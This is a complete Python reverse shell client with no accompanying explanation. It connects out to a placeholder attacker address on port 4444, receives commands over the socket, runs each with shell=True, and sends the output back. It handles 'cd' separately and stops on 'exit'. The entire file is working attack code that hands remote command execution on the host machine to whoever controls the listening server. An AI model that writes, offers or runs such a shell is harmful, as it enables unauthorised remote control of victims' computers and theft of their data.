import socket
import subprocess
import os


SERVER_IP = 'YOUR_IP_ADDRESS'  
SERVER_PORT = 4444  

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break

        if command.startswith('cd '):
            try:
                os.chdir(command.strip('cd '))
                s.send(b'Changed directory')
            except FileNotFoundError as e:
                s.send(str(e).encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)

    s.close()

if __name__ == "__main__":
    connect()
